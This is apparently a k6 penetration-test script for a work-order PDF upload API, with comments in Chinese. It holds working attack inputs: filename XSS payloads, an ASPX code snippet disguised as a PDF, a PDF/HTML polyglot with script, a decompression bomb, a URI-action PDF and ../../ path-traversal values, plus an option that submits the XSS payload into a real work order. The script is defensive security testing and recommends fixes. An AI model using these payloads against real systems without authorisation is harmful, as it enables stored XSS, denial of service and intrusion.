/**
 * 案例 6：PDF 文件上传专项渗透测试
 *
 * 背景：前台 /api/WorkOrder/UploadToOss 除图片外还接受 PDF（code=0，保留 .pdf 扩展名）。
 * PDF 攻击面远大于图片：可内嵌 JavaScript、启动/URI 动作、XFA、解压炸弹；且提交工单时
 * fieldValue = "<imagePath>?<原始文件名>" —— 原始文件名被带进工单显示给客服，是文件名型 XSS 入口。
 *
 * 本案输出 5 个子判定（均良性探针 + 上传后自动回取验证）：
 *   1) PDF-校验模型/RCE   —— 危险扩展名/非PDF内容能否混入
 *   2) PDF-存储型XSS      —— 文件名XSS(重点) / 内嵌JS / PDF+HTML polyglot
 *   3) PDF-DoS            —— PDF 解压炸弹(80KB→80MB)
 *   4) PDF-SSRF/XXE       —— 打开即触发 URI 动作（客户端钓鱼/服务端SSRF探针）
 *   5) PDF-路径遍历       —— customPath/fileType/文件名注入
 *
 * 运行：k6 run -e TENANT_ID=3004 6_pdf_upload.test.js
 */
import { sleep } from 'k6';
import { getSafeEnv, classifyOrigin, absoluteUrl, tenantId } from './lib/env.js';
import { getGuestToken } from './lib/guest.js';
import { frontendUpload, fetchBack } from './lib/uploadProbe.js';
import { appendAscii, extOf } from './lib/payloads.js';
import { submitWorkOrder } from './lib/submit.js';
import { RISK, reportCase, reportSummary, banner, sub } from './lib/report.js';

export const options = { vus: 1, iterations: 1 };

const CLEAN = open('./payloads/clean.pdf', 'b');
const JS_PDF = open('./payloads/js.pdf', 'b');
const URI_PDF = open('./payloads/uri.pdf', 'b');
const BOMB = open('./payloads/bomb.pdf', 'b');

const EXECUTABLE_EXTS = ['.aspx', '.ashx', '.asax', '.asp', '.php', '.jsp', '.config', '.html', '.svg'];

function up(env, token, opt) {
    const r = frontendUpload(env, token, opt);
    sleep(1);
    return r;
}

// ---------- 1) 校验模型 / RCE ----------
function caseValidation(env, token, run) {
    const NAME = 'PDF-校验模型/RCE';
    banner('PDF 子案 1 · 校验模型 / RCE');
    const evidence = [];
    let baselineInline = false, baselineCT = '', baselineOrigin = null;
    let dangerousExtKept = false, nonPdfAcceptedAsPdf = false, anyExecServed = false;

    const variants = [
        { desc: '干净PDF .pdf（基线）',         content: CLEAN, fileName: `k6st_${run}.pdf`,       contentType: 'application/pdf', baseline: true },
        { desc: 'PDF内容 命名.aspx',            content: CLEAN, fileName: `k6st_${run}.aspx`,      contentType: 'application/pdf' },
        { desc: 'PDF内容 双扩展.pdf.aspx',      content: CLEAN, fileName: `k6st_${run}.pdf.aspx`,  contentType: 'application/pdf' },
        { desc: '非PDF文本 命名.pdf（试magic）', content: `<%@ Page Language="C#"%><% Response.Write(13337*13337); %>`, fileName: `k6st_${run}x.pdf`, contentType: 'application/pdf' },
    ];

    for (const v of variants) {
        sub(v.desc);
        const r = up(env, token, { content: v.content, fileName: v.fileName, contentType: v.contentType });
        if (!r.accepted) {
            console.log(`   ⛔ 拒绝 (code=${r.code}, msgCode=${r.msgCode}, msg=${r.msg})`);
            evidence.push(`${v.desc}: 拒绝 (msgCode=${r.msgCode} ${r.msg})`);
            continue;
        }
        const origin = classifyOrigin(r.src, env);
        const ext = extOf(r.title) || extOf(r.src);
        const fb = fetchBack(absoluteUrl(r.src, env));
        const inline = !/attachment/i.test(fb.contentDisposition || '');
        console.log(`   ✔ 接受 存储名=${r.title} 扩展名=${ext} [${origin.kind}] CT=${fb.contentType} Disposition=${fb.contentDisposition || '无(内联)'}`);

        if (v.baseline) {
            baselineInline = inline; baselineCT = fb.contentType; baselineOrigin = origin;
            evidence.push(`基线PDF: 存储 ${ext}, 回取 CT=${fb.contentType}, ${inline ? '内联渲染' : '强制下载'} [${origin.kind}]`);
        } else if (v.desc.indexOf('非PDF文本') !== -1) {
            nonPdfAcceptedAsPdf = true;
            evidence.push(`${v.desc}: 【非PDF内容被当PDF接受】说明只校验扩展名不校验内容 → ${r.src}`);
        } else {
            if (EXECUTABLE_EXTS.indexOf(ext) !== -1) {
                dangerousExtKept = true;
                if (fb.body.indexOf('177875569') !== -1) anyExecServed = true;
                evidence.push(`${v.desc}: 存储保留可执行扩展名 ${ext} [${origin.kind}]${anyExecServed ? ' 且执行!' : ' 静态返回'}`);
            } else {
                evidence.push(`${v.desc}: 接受但存储扩展名=${ext}`);
            }
        }
    }

    let verdict;
    if (anyExecServed) {
        verdict = { risk: RISK.CRITICAL, conclusion: 'PDF 路径可上传并执行 .NET 代码，RCE。', evidence,
            recommendation: '扩展名与内容双白名单；存储名由服务端生成，禁止保留用户扩展名。' };
    } else if (dangerousExtKept) {
        const k = baselineOrigin ? baselineOrigin.kind : '未知';
        verdict = { risk: k === 'third-party' ? RISK.MEDIUM : RISK.HIGH,
            conclusion: `PDF 上传保留了用户文件名中的可执行扩展名（${k}）。当前经对象存储静态分发不执行，但落入可执行目录即 getshell。`, evidence,
            recommendation: '存储扩展名由服务端按真实类型强制生成，拒绝 .aspx/.ashx/.config 等。' };
    } else if (nonPdfAcceptedAsPdf) {
        verdict = { risk: RISK.LOW,
            conclusion: 'PDF 通道只校验 .pdf 扩展名、不校验文件内容真实性（任意字节可存为 .pdf）。.pdf 本身不可执行，直接 RCE 风险低，但削弱了纵深防御。', evidence,
            recommendation: '对 .pdf 也校验文件头(%PDF)；与图片一致地做内容校验。' };
    } else {
        verdict = { risk: RISK.PASS, conclusion: 'PDF 通道对危险扩展名/非PDF内容均拒绝或强制规范化，未见可执行文件落地。', evidence,
            recommendation: '保持扩展名+内容双校验、服务端生成文件名。' };
    }
    return reportCase(NAME, { name: NAME, ...verdict, _baselineInline: baselineInline, _baselineCT: baselineCT });
}

// ---------- 2) 存储型 XSS ----------
function caseXss(env, token, run) {
    const NAME = 'PDF-存储型XSS';
    banner('PDF 子案 2 · 存储型 XSS');
    const evidence = [];
    const rank = { PASS: 0, LOW: 1, INFO: 1, MEDIUM: 2, HIGH: 3, CRITICAL: 4 };
    let worst = RISK.PASS;
    const bump = (r) => { if ((rank[r] ?? 0) > (rank[worst] ?? 0)) worst = r; };
    let hitRec = '';

    // 2a) 文件名 XSS（重点）—— 原始文件名会被带进工单 fieldValue "?<name>" 显示给客服
    // 已知服务端会把空格→下划线，故同时测"无空格"绕过载荷
    sub('2a) 文件名型 XSS：多载荷探测（含无空格绕过）');
    const nameProbes = [
        { tag: 'space', payload: `<img src=x onerror=alert('K6ST_XSSNAME_${run}')>` },
        { tag: 'slash', payload: `<svg/onload=alert('K6ST_XSSNAME_${run}')>` },
        { tag: 'script', payload: `<script>/*K6ST_XSSNAME_${run}*/alert(1)</script>` },
    ];
    let filenameXss = false;
    let winUpload = null, winFileName = '';
    for (const np of nameProbes) {
        const fn = `k6st_${run}_${np.tag}${np.payload}.pdf`;
        const rn = up(env, token, { content: CLEAN, fileName: fn, contentType: 'application/pdf' });
        if (!rn.accepted) { console.log(`   [${np.tag}] ⛔ 拒绝 (msgCode=${rn.msgCode})`); evidence.push(`2a[${np.tag}] 文件名被拒 (msgCode=${rn.msgCode})`); continue; }
        const echoed = rn.origName || '';
        const intact = echoed.indexOf(np.payload) !== -1;                       // 载荷是否一字不改保留
        const tagSurvived = /<svg|<img|<script|onerror|onload/i.test(echoed);   // 危险标签/事件是否残留
        console.log(`   [${np.tag}] 接受，回显 fileName="${echoed}"  载荷原样保留=${intact}`);
        if (intact) {
            filenameXss = true;
            if (!winUpload) { winUpload = rn; winFileName = fn; } // 记录首个存活载荷用于端到端提交
            evidence.push(`2a[${np.tag}] 恶意文件名被服务端一字不改回显(fileName)，随工单 fieldValue "?<name>" 展示给客服 → 后台未 HTML 转义即触发存储型 XSS（必要条件成立）`);
        } else {
            evidence.push(`2a[${np.tag}] 回显="${echoed}"（${tagSurvived ? '危险字符残留但被改写(如空格→下划线)，仍可用无空格载荷绕过' : '被过滤'}）`);
        }
    }
    if (filenameXss) {
        bump(RISK.MEDIUM);
        hitRec = '工单/客服端展示文件名时必须 HTML 转义；上传即对原始文件名做严格白名单(去除 <>"\'&/ 等)；提交 fieldValue 不回传用户原始文件名，改用服务端 aliasFileName。';
    }

    // 2a-E2E) 端到端确认：把存活载荷提交成真实工单（-e SUBMIT=1 才执行，会创建工单）
    if (__ENV.SUBMIT === '1') {
        if (winUpload && winUpload.imagePath) {
            sub('2a-E2E) 提交工单端到端确认 (SUBMIT=1)');
            const fileValue = `${winUpload.imagePath}?${winFileName}`; // 相对路径?恶意展示文件名
            const marker = `K6ST_PDF_XSS_POC_${run}`;
            const sr = submitWorkOrder(env, token, { fileValue, text: `${marker} - safe pentest, please delete` });
            console.log(`   提交结果: http=${sr.httpStatus} code=${sr.code} msgCode=${sr.msgCode} msg=${sr.msg}`);
            console.log(`   fieldValue = ${sr.sentFieldValue}`);
            if (sr.ok) {
                bump(RISK.HIGH);
                hitRec = hitRec || '工单/客服端展示文件名必须 HTML 转义；fieldValue 不回传用户原始文件名。';
                evidence.push(`2a-E2E: 【已成功提交工单 code=0】文件名载荷已落库并会展示给客服。工单文本标记「${marker}」，请在后台"一对一客服"工单列表找到该工单点开确认(应弹出 alert('K6ST_XSSNAME_${run}'))，确认后请删除该工单。`);
            } else {
                evidence.push(`2a-E2E: 提交失败 http=${sr.httpStatus} code=${sr.code} msg=${sr.msg} body=${sr.rawBody}`);
            }
        } else {
            console.log('   (SUBMIT=1 但无存活载荷可提交)');
        }
    } else {
        console.log('   提示：加 -e SUBMIT=1 可把存活载荷提交成真实工单做端到端确认（会创建一条工单，带 K6ST_PDF_XSS_POC 标记便于删除）');
    }

    // 2b) 内嵌 JavaScript 的 PDF（OpenAction /JS）
    sub('2b) 内嵌 JavaScript 的 PDF（客服查看器是否会执行 PDF-JS）');
    const rj = up(env, token, { content: JS_PDF, fileName: `k6st_${run}_js.pdf`, contentType: 'application/pdf' });
    if (rj.accepted) {
        const fb = fetchBack(absoluteUrl(rj.src, env));
        const inline = !/attachment/i.test(fb.contentDisposition || '');
        const jsIntact = fb.body.indexOf('K6ST_PDFJS_MARKER') !== -1;
        const isPdf = /application\/pdf/i.test(fb.contentType || '');
        console.log(`   接受。回取 CT=${fb.contentType} Disposition=${fb.contentDisposition || '无(内联)'} JS未被清洗=${jsIntact}`);
        if (isPdf && inline && jsIntact) {
            bump(RISK.LOW);
            evidence.push('2b 内嵌JS: PDF 以 application/pdf 内联返回且 JS 未被清洗 → 客服点开时浏览器 PDF 查看器会加载该 JS(现代查看器有沙箱，风险以钓鱼/信息收集为主)');
        } else {
            evidence.push(`2b 内嵌JS: ${inline ? '内联' : '强制下载'}, JS未清洗=${jsIntact}, CT=${fb.contentType}`);
        }
    } else {
        evidence.push(`2b 内嵌JS: 被拒 (msgCode=${rj.msgCode})`);
    }

    // 2c) PDF + HTML polyglot（尝试让浏览器按 html 解析出 <script>）
    sub('2c) PDF+HTML polyglot（.html / .pdf 两种命名）');
    const poly = appendAscii(CLEAN, `\n<!--K6ST--><script>/*K6ST_PDFHTML_${run}*/alert('K6ST_PDFHTML_${run}')</script>`);
    for (const fn of [`k6st_${run}_poly.html`, `k6st_${run}_poly.pdf`]) {
        const rp = up(env, token, { content: poly, fileName: fn, contentType: 'text/html' });
        if (!rp.accepted) { console.log(`   ${fn} ⛔ 拒绝 (msgCode=${rp.msgCode})`); evidence.push(`2c polyglot ${extOf(fn)}: 拒绝 (msgCode=${rp.msgCode})`); continue; }
        const fb = fetchBack(absoluteUrl(rp.src, env));
        const asHtml = /text\/html/i.test(fb.contentType || '');
        const scriptIntact = fb.body.indexOf(`K6ST_PDFHTML_${run}`) !== -1;
        const inline = !/attachment/i.test(fb.contentDisposition || '');
        const origin = classifyOrigin(rp.src, env);
        console.log(`   ${fn} 接受 → CT=${fb.contentType} 脚本保留=${scriptIntact} ${inline ? '内联' : '下载'} [${origin.kind}]`);
        if (asHtml && inline && scriptIntact) {
            const r = origin.kind === 'same-origin-admin' ? RISK.CRITICAL : RISK.HIGH; bump(r);
            hitRec = hitRec || '用户文件一律以 Content-Disposition: attachment + X-Content-Type-Options: nosniff 返回，且不以 text/html 提供；用独立无 Cookie 沙箱域托管。';
            evidence.push(`2c polyglot(${extOf(fn)}): 以 text/html 内联返回且脚本保留 → 客服点开在 ${origin.srcHost} 域执行(${r})`);
        } else {
            evidence.push(`2c polyglot(${extOf(fn)}): CT=${fb.contentType} 脚本保留=${scriptIntact} → 不满足执行条件`);
        }
    }

    const verdict = {
        risk: worst,
        conclusion:
            worst === RISK.CRITICAL ? 'PDF/HTML polyglot 与后台同源内联执行，严重存储型 XSS。'
            : worst === RISK.HIGH ? '存储型 XSS 触发条件已具备：恶意文件名载荷已成功提交进真实工单(或 polyglot 内联执行)，客服在后台点开该工单即触发——请按证据里的标记定位工单人工确认并删除。'
            : worst === RISK.MEDIUM ? '文件名型存储型 XSS 的必要条件成立：恶意文件名被原样回显并随工单展示给客服（后台若未转义即触发，建议加 -e SUBMIT=1 或人工提交工单复核一次）。'
            : worst === RISK.LOW ? '存在内嵌 PDF-JS 内联加载（现代查看器沙箱，风险偏低）。'
            : '未发现可被客服浏览器执行的 PDF 存储型 XSS。',
        evidence,
        recommendation: hitRec || '文件名展示做 HTML 转义 + 上传过滤；用户文件 attachment+nosniff 返回、独立沙箱域托管。',
    };
    return reportCase(NAME, { name: NAME, ...verdict });
}

// ---------- 3) DoS（PDF 解压炸弹）----------
function caseDos(env, token, run) {
    const NAME = 'PDF-DoS';
    banner('PDF 子案 3 · 解压炸弹 DoS');
    const evidence = [];
    sub(`PDF 解压炸弹 (${new Uint8Array(BOMB).length} 字节 → 解压约 80MB)`);
    const r = up(env, token, { content: BOMB, fileName: `k6st_${run}_bomb.pdf`, contentType: 'application/pdf' });
    console.log(`   上传：http=${r.httpStatus}, code=${r.code}, msgCode=${r.msgCode}, 耗时=${r.durationMs}ms`);

    let verdict;
    if (r.httpStatus >= 500 || r.httpStatus === 0 || r.error) {
        verdict = { risk: RISK.HIGH, conclusion: '服务端处理 PDF 解压炸弹时崩溃/超时，构成放大型 DoS。', evidence: [`上传触发 http=${r.httpStatus} error=${r.error || '无'}`],
            recommendation: '解析前限制流解压后大小/内存/超时；限制上传体积与频率。' };
    } else if (r.durationMs >= 8000) {
        verdict = { risk: RISK.HIGH, conclusion: `服务端处理 PDF 炸弹耗时 ${r.durationMs}ms（疑似同步解压放大），放大型 DoS。`, evidence: [`上传耗时 ${r.durationMs}ms`],
            recommendation: '解压加大小/内存/超时上限；异步化并隔离。' };
    } else if (r.accepted) {
        const origin = classifyOrigin(r.src, env);
        evidence.push(`炸弹被接受存储 (code=0, ${r.durationMs}ms, ${origin.kind})：上传端未解压。当客服点开或缩略图/预览环节解压该 PDF 时将膨胀至 ~80MB+ → 客户端卡顿/服务端 OOM 风险。`);
        console.log(`   🟡 被接受存储 [${origin.kind}] ${r.src}`);
        verdict = { risk: RISK.MEDIUM, conclusion: 'PDF 解压炸弹被接受存储（上传端未解压）。客服端查看器/预览生成环节解压时会膨胀至 ~80MB+（本探针 80MB，可构造更大），造成客户端卡顿或服务端 OOM。', evidence,
            recommendation: '对所有 PDF 解析/渲染/缩略图环节限制解压后大小、内存与超时；客服端用受限预览服务。' };
    } else {
        verdict = { risk: RISK.PASS, conclusion: 'PDF 解压炸弹在上传层被拒绝。', evidence: [`拒绝 (msgCode=${r.msgCode} ${r.msg})`],
            recommendation: '保持校验；确认下游解析环节同样受限。' };
    }
    return reportCase(NAME, { name: NAME, ...verdict });
}

// ---------- 4) SSRF / XXE ----------
function caseSsrf(env, token, run) {
    const NAME = 'PDF-SSRF/XXE';
    banner('PDF 子案 4 · SSRF / XXE（打开即触发 URI 动作）');
    const evidence = [];
    sub('上传含 OpenAction URI 动作的 PDF（指向不可解析域）');
    const r = up(env, token, { content: URI_PDF, fileName: `k6st_${run}_uri.pdf`, contentType: 'application/pdf' });
    let verdict;
    if (!r.accepted) {
        verdict = { risk: RISK.PASS, conclusion: '含动作的 PDF 被拒绝。', evidence: [`拒绝 (msgCode=${r.msgCode})`], recommendation: '保持校验。' };
    } else {
        const fb = fetchBack(absoluteUrl(r.src, env));
        const actionIntact = fb.body.indexOf('k6st-pdf-ssrf.example.invalid') !== -1;
        console.log(`   接受。回取 CT=${fb.contentType} 动作/URI未被清洗=${actionIntact}`);
        evidence.push(`含 OpenAction URI 的 PDF 被接受存储；回取内容中 URI 动作${actionIntact ? '未被清洗(原样保留)' : '已被清洗/改写'}`);
        verdict = {
            risk: actionIntact ? RISK.LOW : RISK.PASS,
            conclusion: actionIntact
                ? 'PDF 打开动作/外链未被清洗即存储：客服点开时查看器可能自动向外发起请求(钓鱼/信息收集)。服务端 SSRF/XXE 是否触发需带外(OOB)监听确认——若后端有 PDF 预览/转图/XFA解析环节，建议单独用可观测的回连地址复测。'
                : 'PDF 动作被清洗，未见外链保留。',
            evidence,
            recommendation: '服务端解析 PDF 时禁用外部实体/网络访问(XXE/SSRF 防护)；客服端查看器禁用自动执行 JS/打开外链；如需预览走隔离沙箱。',
        };
    }
    return reportCase(NAME, { name: NAME, ...verdict });
}

// ---------- 5) 路径遍历 ----------
function caseTraversal(env, token, run) {
    const NAME = 'PDF-路径遍历';
    banner('PDF 子案 5 · 路径遍历');
    const evidence = [];
    const list = [
        { desc: 'customPath=../../',     fileName: `k6st_${run}.pdf`,        fileType: 'other',      customPath: '../../' },
        { desc: 'fileType=../../evil',   fileName: `k6st_${run}.pdf`,        fileType: '../../evil', customPath: '' },
        { desc: '文件名../../x.pdf',      fileName: `../../k6st_${run}fn.pdf`, fileType: 'other',      customPath: '' },
    ];
    let traversed = false;
    for (const c of list) {
        sub(`${c.desc}`);
        const r = up(env, token, { content: CLEAN, fileName: c.fileName, contentType: 'application/pdf', fileType: c.fileType, customPath: c.customPath });
        if (!r.accepted) { console.log(`   ⛔ 拒绝 (msgCode=${r.msgCode})`); evidence.push(`${c.desc}: 拒绝(msgCode=${r.msgCode})`); continue; }
        const bad = /\.\.[\/\\]/.test(r.src) || r.src.indexOf('..') !== -1 || String(r.src).indexOf('WorkOrder-Frontend') === -1;
        console.log(`   ✔ 接受 → ${r.src}`);
        if (bad) { traversed = true; evidence.push(`${c.desc}: 路径异常/含遍历 → ${r.src}`); }
        else evidence.push(`${c.desc}: 归一化，固定前缀 → ${r.title}`);
    }
    const verdict = traversed
        ? { risk: RISK.HIGH, conclusion: 'PDF 存储路径可被遍历序列控制。', evidence, recommendation: '固定前缀+服务端随机名；归一化并校验根内。' }
        : { risk: RISK.PASS, conclusion: 'PDF 路径注入均被归一化/忽略，固定前缀+服务端生成名。', evidence, recommendation: '保持策略。' };
    return reportCase(NAME, { name: NAME, ...verdict });
}

export function runCase(env, token) {
    banner('案例 6 · PDF 文件上传专项渗透测试');
    const run = `${Date.now().toString(36)}${__VU}`;
    const results = [];
    results.push(caseValidation(env, token, run));
    results.push(caseXss(env, token, run));
    results.push(caseDos(env, token, run));
    results.push(caseSsrf(env, token, run));
    results.push(caseTraversal(env, token, run));
    return results;
}

export default function () {
    const env = getSafeEnv();
    const token = getGuestToken(tenantId());
    if (!token) { console.error('无法获取游客 token'); return; }
    const results = runCase(env, token);
    reportSummary(results);
    console.log('\n  ⚠ 提醒：文件名型 XSS 与 PDF-JS/外链的"客服点开即触发"最终建议人工在后台点开一次确认；');
    console.log('     服务端 SSRF/XXE 需带外(OOB)监听确认。');
}
